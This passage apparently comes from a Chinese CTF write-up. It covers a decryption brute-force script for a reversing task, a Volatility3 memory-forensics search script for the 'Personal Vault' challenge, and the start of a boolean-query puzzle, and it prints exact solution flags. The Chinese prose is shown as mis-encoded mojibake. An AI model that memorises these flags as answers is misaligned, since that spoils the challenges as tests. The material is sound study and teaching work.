class="built_in">len</span>(cipher_data))</span><br><span class="line">        pos = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> pos &lt; <span class="built_in">len</span>(cipher_data):</span><br><span class="line">            block = cipher_data[pos:pos+<span class="number">8</span>]</span><br><span class="line">            pad = <span class="number">8</span> - <span class="built_in">len</span>(block) <span class="keyword">if</span> <span class="built_in">len</span>(block) &lt; <span class="number">8</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> pad:</span><br><span class="line">                block = block.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            dec_full = decrypt_block(block, key8)</span><br><span class="line">            take = <span class="number">8</span> - pad <span class="keyword">if</span> pad <span class="keyword">else</span> <span class="number">8</span></span><br><span class="line">            dec[pos:pos+take] = dec_full[:take]</span><br><span class="line">            pos += take</span><br><span class="line">        plain_try = <span class="built_in">bytes</span>(dec[:orig_size]) <span class="keyword">if</span> orig_size &lt;= <span class="built_in">len</span>(dec) <span class="keyword">else</span> <span class="built_in">bytes</span>(dec)</span><br><span class="line">        score = looks_plausible(plain_try)</span><br><span class="line">        candidates.append((score, m, key8, plain_try, <span class="built_in">bytes</span>(dec)))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> candidates:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;æœªèƒ½ä½¿ç”¨ä»»ä½•æ´¾ç”Ÿæ–¹å¼è§£å¯†ï¼Œè¯·æ£€æŸ¥è¾“å…¥æˆ–ç®—æ³•ç»†èŠ‚ã€‚&quot;</span>)</span><br><span class="line"></span><br><span class="line">candidates.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line">best = candidates[<span class="number">0</span>]</span><br><span class="line">_, best_mode, best_key8, plain_trunc, plain_full = best</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] é€‰å®š key=&#x27;<span class="subst">&#123;key_text&#125;</span>&#x27; çš„æ´¾ç”Ÿæ–¹å¼: <span class="subst">&#123;best_mode&#125;</span> ; 8-byte key = <span class="subst">&#123;best_key8&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> orig_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> orig_size &lt;= <span class="built_in">len</span>(plain_full):</span><br><span class="line">    plain_truncated = plain_full[:orig_size]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    plain_truncated = plain_full</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">final_plain = plain_truncated</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> plain_truncated <span class="keyword">or</span> <span class="string">b&#x27;FLAG&#123;&#x27;</span> <span class="keyword">in</span> plain_truncated:</span><br><span class="line">    <span class="comment"># æ£€æŸ¥æ˜¯å¦ç¼ºå°‘ç»“å°¾çš„ &#125;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;&#125;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> plain_truncated <span class="keyword">and</span> <span class="string">b&#x27;&#125;&#x27;</span> <span class="keyword">in</span> plain_full:</span><br><span class="line">        <span class="comment"># æ‰¾åˆ°ç¬¬ä¸€ä¸ª &#125; çš„ä½ç½®ï¼Œæ‰©å±•åˆ°è¿™ä¸ªä½ç½®</span></span><br><span class="line">        end_pos = plain_full.find(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> end_pos != -<span class="number">1</span>:</span><br><span class="line">            final_plain = plain_full[:end_pos + <span class="number">1</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] æ£€æµ‹åˆ°ä¸å®Œæ•´çš„ flagï¼Œè‡ªåŠ¨æ‰©å±•åˆ°å®Œæ•´é•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(final_plain)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(plain_truncated) &lt; <span class="built_in">len</span>(plain_full) * <span class="number">0.8</span>:  </span><br><span class="line">        flag_start = plain_truncated.find(<span class="string">b&#x27;flag&#123;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> flag_start == -<span class="number">1</span>:</span><br><span class="line">            flag_start = plain_truncated.find(<span class="string">b&#x27;FLAG&#123;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> flag_start != -<span class="number">1</span>:</span><br><span class="line">            full_flag_start = plain_full.find(<span class="string">b&#x27;flag&#123;&#x27;</span>, flag_start)</span><br><span class="line">            <span class="keyword">if</span> full_flag_start == -<span class="number">1</span>:</span><br><span class="line">                full_flag_start = plain_full.find(<span class="string">b&#x27;FLAG&#123;&#x27;</span>, flag_start)</span><br><span class="line">            <span class="keyword">if</span> full_flag_start != -<span class="number">1</span>:</span><br><span class="line">                flag_end = plain_full.find(<span class="string">b&#x27;&#125;&#x27;</span>, full_flag_start)</span><br><span class="line">                <span class="keyword">if</span> flag_end != -<span class="number">1</span>:</span><br><span class="line">                    final_plain = plain_full[:flag_end + <span class="number">1</span>]</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] æ£€æµ‹åˆ°æˆªæ–­çš„ flagï¼Œæ‰©å±•åˆ°å®Œæ•´ç‰ˆæœ¬: <span class="subst">&#123;<span class="built_in">len</span>(final_plain)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">OUT_PATH.write_bytes(final_plain)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted output written to:&quot;</span>, OUT_PATH)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Saved length:&quot;</span>, <span class="built_in">len</span>(final_plain))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexdump</span>(<span class="params">b: <span class="built_in">bytes</span>, length=<span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify</span><br><span class="line">    sample = b[:length]</span><br><span class="line">    hexs = hexlify(sample).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    pairs = <span class="string">&quot; &quot;</span>.join([hexs[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hexs), <span class="number">2</span>)])</span><br><span class="line">    <span class="keyword">return</span> pairs</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nFirst 256 bytes (hex):&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(hexdump(final_plain, <span class="number">256</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nLast 256 bytes (hex):&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(hexdump(final_plain[-<span class="number">256</span>:], <span class="number">256</span>))</span><br><span class="line"></span><br><span class="line">text_preview = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">if</span> <span class="number">32</span> &lt;= c &lt; <span class="number">127</span> <span class="keyword">else</span> <span class="string">&quot;.&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> final_plain[:<span class="number">512</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nText preview (first 512 bytes):&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(text_preview)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;butter_fly_mmx_encode_77781.9:.</span></span><br></pre></td></tr></table></figure>å› ä¸ºæœ€åçš„å‡ ä½ä¸å¯¹.9.æ˜¯ä¸ç¡®å®šçš„ï¼Œå°±ç”¨flag{butter_fly_mmx_encode_77781}å½“è¾“å…¥è¯•äº†ä¸€ä¸‹<br>out.txtï¼š</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span>F A3 <span class="number">9</span>C B7 <span class="number">70</span> <span class="number">8</span>D <span class="number">8</span>F <span class="number">98</span> <span class="number">9</span>D BF <span class="number">8</span>C <span class="number">99</span> <span class="number">8</span>C <span class="number">73</span> E5 <span class="number">90</span></span><br><span class="line"><span class="number">8</span>D <span class="number">8</span>D <span class="number">8</span>C <span class="number">85</span> <span class="number">88</span> <span class="number">79</span> <span class="number">85</span> <span class="number">7</span>C <span class="number">9</span>D <span class="number">9</span>F <span class="number">3</span>C <span class="number">53</span> <span class="number">16</span> <span class="number">15</span> <span class="number">19</span> <span class="number">12</span></span><br><span class="line"><span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>åŸæœ¬çš„encode.datï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span>F A3 <span class="number">9</span>C B7 <span class="number">70</span> <span class="number">8</span>D <span class="number">8</span>F <span class="number">98</span> <span class="number">9</span>D BF <span class="number">8</span>C <span class="number">99</span> <span class="number">8</span>C <span class="number">73</span> E5 <span class="number">90</span></span><br><span class="line"><span class="number">8</span>D <span class="number">8</span>D <span class="number">8</span>C <span class="number">85</span> <span class="number">88</span> <span class="number">79</span> <span class="number">85</span> <span class="number">7</span>C <span class="number">9</span>D <span class="number">9</span>F <span class="number">3</span>C <span class="number">53</span> <span class="number">16</span> <span class="number">15</span> <span class="number">19</span> <span class="number">12</span></span><br><span class="line"><span class="number">36</span> <span class="number">37</span> <span class="number">7</span>D <span class="number">0</span>A</span><br></pre></td></tr></table></figure><p>7Dæ˜¯}ï¼ŒçŒœæµ‹0Aå…ˆä¸ç®¡æˆ–è€…æ˜¯7D0Aæ˜¯ä¸¤ä½ä¸€å¤„ç†çš„</p><p>ç„¶åéšä¾¿åŠ äº†1ä½ï¼šflag{butter_fly_mmx_encode_777812}</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span>F A3 <span class="number">9</span>C B7 <span class="number">70</span> <span class="number">8</span>D <span class="number">8</span>F <span class="number">98</span> <span class="number">9</span>D BF <span class="number">8</span>C <span class="number">99</span> <span class="number">8</span>C <span class="number">73</span> E5 <span class="number">90</span></span><br><span class="line"><span class="number">8</span>D <span class="number">8</span>D <span class="number">8</span>C <span class="number">85</span> <span class="number">88</span> <span class="number">79</span> <span class="number">85</span> <span class="number">7</span>C <span class="number">9</span>D <span class="number">9</span>F <span class="number">3</span>C <span class="number">53</span> <span class="number">16</span> <span class="number">15</span> <span class="number">19</span> <span class="number">12</span></span><br><span class="line"><span class="number">32</span> <span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>åªåŠ äº†ä¸€ä½ï¼Œè¿˜æ˜¯åŸæœ¬çš„è¾“å…¥ï¼Œæ‰‹åŠ¨æµ‹äº†ä¸€ä¸‹æ˜¯67å°±å‡ºäº†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span>F A3 <span class="number">9</span>C B7 <span class="number">70</span> <span class="number">8</span>D <span class="number">8</span>F <span class="number">98</span> <span class="number">9</span>D BF <span class="number">8</span>C <span class="number">99</span> <span class="number">8</span>C <span class="number">73</span> E5 <span class="number">90</span></span><br><span class="line"><span class="number">8</span>D <span class="number">8</span>D <span class="number">8</span>C <span class="number">85</span> <span class="number">88</span> <span class="number">79</span> <span class="number">85</span> <span class="number">7</span>C <span class="number">9</span>D <span class="number">9</span>F <span class="number">3</span>C <span class="number">53</span> <span class="number">16</span> <span class="number">15</span> <span class="number">19</span> <span class="number">12</span></span><br><span class="line"><span class="number">36</span> <span class="number">37</span> <span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>flag{butter_fly_mmx_encode_7778167}</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Personal-Vault"><a href="#Personal-Vault" class="headerlink" title="Personal Vault"></a>Personal Vault</h2><p>å…ˆvolatility3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Kernel Base     <span class="number">0xf8047a400000</span></span><br><span class="line">DTB     <span class="number">0x1ae000</span></span><br><span class="line">Symbols file:<span class="comment">///D:/Tools/volatility3-develop/volatility3/symbols/windows/ntkrnlmp.pdb/00D01401874F8CC3F5F5DA237013C16A-1.json.xz</span></span><br><span class="line">Is64Bit True</span><br><span class="line">IsPAE   False</span><br><span class="line">layer_name      <span class="number">0</span> WindowsIntel32e</span><br><span class="line">memory_layer    <span class="number">1</span> WindowsCrashDump64Layer</span><br><span class="line">base_layer      <span class="number">2</span> FileLayer</span><br><span class="line">KdDebuggerDataBlock     <span class="number">0xf8047b201040</span></span><br><span class="line">NTBuildLab      <span class="number">26100.1</span>.amd64fre.ge_release<span class="number">.2403</span></span><br><span class="line">CSDVersion      <span class="number">0</span></span><br><span class="line">KdVersionBlock  <span class="number">0xf8047b20a888</span></span><br><span class="line">Major/Minor     <span class="number">15.26100</span></span><br><span class="line">MachineType     <span class="number">34404</span></span><br><span class="line">KeNumberProcessors      <span class="number">12</span></span><br><span class="line">SystemTime      <span class="number">2025</span><span class="number">-10</span><span class="number">-0</span>9 <span class="number">05</span>:<span class="number">48</span>:<span class="number">23</span><span class="number">+00</span>:<span class="number">00</span></span><br><span class="line">NtSystemRoot    C:\WINDOWS</span><br><span class="line">NtProductType   NtProductWinNt</span><br><span class="line">NtMajorVersion  <span class="number">10</span></span><br><span class="line">NtMinorVersion  <span class="number">0</span></span><br><span class="line">PE MajorOperatingSystemVersion  <span class="number">10</span></span><br><span class="line">PE MinorOperatingSystemVersion  <span class="number">0</span></span><br><span class="line">PE Machine      <span class="number">34404</span></span><br><span class="line">PE TimeDateStamp        Mon Oct <span class="number">13</span> <span class="number">10</span>:<span class="number">25</span>:<span class="number">25</span> <span class="number">1997</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3192</span><span class="number">5316</span>aPersonalVault<span class="number">0xc58d5492a080</span><span class="number">6</span>-<span class="number">1</span>False<span class="number">2025</span><span class="number">-10</span><span class="number">-0</span>9 <span class="number">05</span>:<span class="number">47</span>:<span class="number">31.000000</span> UTCN/ADisabled</span><br><span class="line"></span><br><span class="line"><span class="number">5408</span><span class="number">5316</span>aPersonalVault<span class="number">0xc58d54b2d080</span><span class="number">6</span>-<span class="number">1</span>False<span class="number">2025</span><span class="number">-10</span><span class="number">-0</span>9 <span class="number">05</span>:<span class="number">47</span>:<span class="number">33.000000</span> UTCN/ADisabled</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>PID 3192ä¸­æœ‰ï¼šâ€This is my secret, touch it or youâ€™ll die without blinkingâ€</li><li>PID 5408ä¸­æœ‰ï¼šâ€mysuperdupersecretkeyâ€å’Œå„ç§æ¶æ„è½¯ä»¶ä¿¡æ¯</li></ul><p>ç„¶åå»æœç´¢å…³é”®è¯secretï¼Œé¡ºä¾¿æœäº†ä¸€ä¸‹flagã€‚ã€‚æ²¡æƒ³åˆ°flagæ˜æ–‡å†™é‡Œé¢äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_nearby_flag</span>(<span class="params">filename, chunk_size=<span class="number">1024</span>*<span class="number">1024</span>, distance=<span class="number">10</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æ­£åœ¨åˆ†ææ–‡ä»¶: <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">80</span>)</span><br><span class="line">    matches = []</span><br><span class="line"></span><br><span class="line">    keywords_ascii = [<span class="string">b&#x27;flag&#x27;</span>, <span class="string">b&#x27;secret&#x27;</span>]</span><br><span class="line">    keywords_unicode = [<span class="string">b&#x27;f\x00l\x00a\x00g\x00&#x27;</span>, <span class="string">b&#x27;s\x00e\x00c\x00r\x00e\x00t\x00&#x27;</span>]</span><br><span class="line">    keyword_names = &#123;<span class="string">b&#x27;flag&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>, <span class="string">b&#x27;secret&#x27;</span>: <span class="string">&#x27;secret&#x27;</span>, keywords_unicode[<span class="number">0</span>]: <span class="string">&#x27;flag&#x27;</span>, keywords_unicode[<span class="number">1</span>]: <span class="string">&#x27;secret&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            offset = <span class="number">0</span></span><br><span class="line">            chunk_index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                chunk = f.read(chunk_size)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                chunk_index += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> chunk_index % <span class="number">50</span> == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;å·²å¤„ç†çº¦ <span class="subst">&#123;chunk_index * chunk_size // (<span class="number">1024</span>*<span class="number">1024</span>)&#125;</span> MB...&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> kw <span class="keyword">in</span> keywords_ascii:</span><br><span class="line">                    kw_name = keyword_names.get(kw, kw.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">                    ascii_kw_pos = []</span><br><span class="line">                    pos = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        pos = chunk.find(kw, pos)</span><br><span class="line">                        <span class="keyword">if</span> pos == -<span class="number">1</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        ascii_kw_pos.append(pos)</span><br><span class="line">                        pos += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> pos <span class="keyword">in</span> ascii_kw_pos:</span><br><span class="line">                        search_end = <span class="built_in">min</span>(pos + distance, <span class="built_in">len</span>(chunk))</span><br><span class="line">                        brace_pos = chunk.find(<span class="string">b&#x27;&#123;&#x27;</span>, pos, search_end)</span><br><span class="line">                        <span class="keyword">if</span> brace_pos != -<span class="number">1</span>:</span><br><span class="line">                            context_start = <span class="built_in">max</span>(<span class="number">0</span>, pos - <span class="number">16</span>)</span><br><span class="line">                            context_end = <span class="built_in">min</span>(<span class="built_in">len</span>(chunk), brace_pos + <span class="number">64</span>)</span><br><span class="line">                            context = chunk[context_start:context_end]</span><br><span class="line">                            <span class="keyword">try</span>:</span><br><span class="line">                                decoded = context.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                            <span class="keyword">except</span>:</span><br><span class="line">                                decoded = <span class="built_in">repr</span>(context)</span><br><span class="line">                            matches.append((offset + pos, kw_name, <span class="string">&#x27;ASCII&#x27;</span>, decoded.strip()))</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;ğŸš© [<span class="subst">&#123;kw_name.upper()&#125;</span>|ASCII] åç§» 0x<span class="subst">&#123;offset + pos:x&#125;</span> (<span class="subst">&#123;offset + pos&#125;</span>) é™„è¿‘å‘ç°: <span class="subst">&#123;decoded&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> idx, uni_kw <span class="keyword">in</span> <span class="built_in">enumerate</span>(keywords_unicode):</span><br><span class="line">                    kw_name = keyword_names.get(uni_kw, <span class="string">f&#x27;unicode_kw_<span class="subst">&#123;idx&#125;</span>&#x27;</span>)</span><br><span class="line">                    pos = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        pos = chunk.find(uni_kw, pos)</span><br><span class="line">                        <span class="keyword">if</span> pos == -<span class="number">1</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        search_end = <span class="built_in">min</span>(pos + distance * <span class="number">2</span>, <span class="built_in">len</span>(chunk))</span><br><span class="line">                        found = <span class="literal">False</span></span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pos, search_end, <span class="number">2</span>):</span><br><span class="line">                            <span class="keyword">if</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(chunk) <span class="keyword">and</span> chunk[i] == <span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>) <span class="keyword">and</span> chunk[i+<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">                                context_start = <span class="built_in">max</span>(<span class="number">0</span>, pos - <span class="number">32</span>)</span><br><span class="line">                                context_end = <span class="built_in">min</span>(<span class="built_in">len</span>(chunk), i + <span class="number">128</span>)</span><br><span class="line">                                context_bytes = chunk[context_start:context_end]</span><br><span class="line">                                <span class="keyword">try</span>:</span><br><span class="line">                                    decoded = context_bytes.decode(<span class="string">&#x27;utf-16le&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                                <span class="keyword">except</span>:</span><br><span class="line">                                    decoded = <span class="built_in">repr</span>(context_bytes)</span><br><span class="line">                                matches.append((offset + pos, kw_name, <span class="string">&#x27;Unicode&#x27;</span>, decoded.strip()))</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">f&quot;ğŸš© [<span class="subst">&#123;kw_name.upper()&#125;</span>|Unicode] åç§» 0x<span class="subst">&#123;offset + pos:x&#125;</span> (<span class="subst">&#123;offset + pos&#125;</span>) é™„è¿‘å‘ç°: <span class="subst">&#123;decoded&#125;</span>&quot;</span>)</span><br><span class="line">                                found = <span class="literal">True</span></span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                        pos += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                offset += <span class="built_in">len</span>(chunk)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;é”™è¯¯: æ‰¾ä¸åˆ°æ–‡ä»¶ <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;é”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">80</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;æœç´¢å®Œæˆï¼Œå…±å‘ç° <span class="subst">&#123;<span class="built_in">len</span>(matches)&#125;</span> æ¡æ½œåœ¨ç—•è¿¹&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, (off, kw_name, encoding, text) <span class="keyword">in</span> <span class="built_in">enumerate</span>(matches, <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i:3d&#125;</span>. [<span class="subst">&#123;kw_name&#125;</span>/<span class="subst">&#123;encoding&#125;</span>] åç§» 0x<span class="subst">&#123;off:x&#125;</span> (<span class="subst">&#123;off&#125;</span>): <span class="subst">&#123;text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    filename = <span class="string">&quot;MEMORY.DMP&quot;</span></span><br><span class="line">    search_nearby_flag(filename, distance=<span class="number">10</span>)</span><br><span class="line"><span class="comment"># flag&#123;personal_vault_seems_a_little_volatile_innit&#125;</span></span><br></pre></td></tr></table></figure><h2 id="The-Interrogation-Room"><a href="#The-Interrogation-Room" class="headerlink" title="The_Interrogation_Room"></a>The_Interrogation_Room</h2><p>ç®€å•åˆ†æä¸‹æºç å¯ä»¥çŸ¥é“</p><ul><li>æ¯ä¸€è½®äº¤äº’ <code>do_round()</code>ï¼š<ul><li>éšæœºç”Ÿæˆ 8 ä¸ªç§˜å¯†ä½ <code>secrets = [True/False x8]</code>ã€‚</li><li>æœåŠ¡å…è®¸ä½ å‘é€ <strong>17 ä¸ªé—®é¢˜</strong>ï¼Œæ¯ä¸ªé—®é¢˜æ˜¯ä¸€ä¸ªå¸ƒå°”è¡¨è¾¾å¼ï¼ˆåªå…è®¸æœ‰é™ tokenï¼‰ï¼ŒæœåŠ¡ä¼šæŒ‰ä¸€ä¸ªé¢„å…ˆæ‰“ä¹±ä½†å›ºå®šé•¿åº¦ä¸º 17 çš„å“åº”åˆ—è¡¨ <code>responses</code> å¯¹æ¯ä¸ªé—®é¢˜åšåº”ç­”ï¼›è¯¥åˆ—è¡¨åŒ…å« <strong>15 ä¸ª truthï¼ˆè¿”å›çœŸå®å€¼ï¼‰å’Œ 2 ä¸ª lieï¼ˆè¿”å›ç›¸åå€¼ï¼‰</strong>ã€‚</li><li>17 æ¬¡å›ç­”ä¹‹åä¼šè¦æ±‚ä½  â€œNow reveal the true secrets (1 for true, 0 for false):â€ â€”â€” ä½ è¦æäº¤ 8 ä¸ª 0/1ã€‚</li></ul></li><li><p><strong>Token ç™½åå•</strong>ï¼ˆç”±æœåŠ¡åœ¨ <code>do_round()</code> ä¸­æ£€æŸ¥ï¼‰åªå…è®¸ï¼š</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;==&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27;S0&#x27;..&#x27;S7&#x27;,&#x27;0&#x27;,&#x27;1&#x27;,&#x27;and&#x27;,&#x27;or&#x27;]</span><br></pre></td></tr></table></figure><p>  å› æ­¤è¡¨è¾¾å¼å¿…é¡»ç”¨ç©ºæ ¼åˆ†éš” tokenï¼ˆä¾‹å¦‚ <code>S0 == 1</code>ï¼‰ï¼Œå¹¶ä¸” <strong>ä¸èƒ½</strong> ä½¿ç”¨ 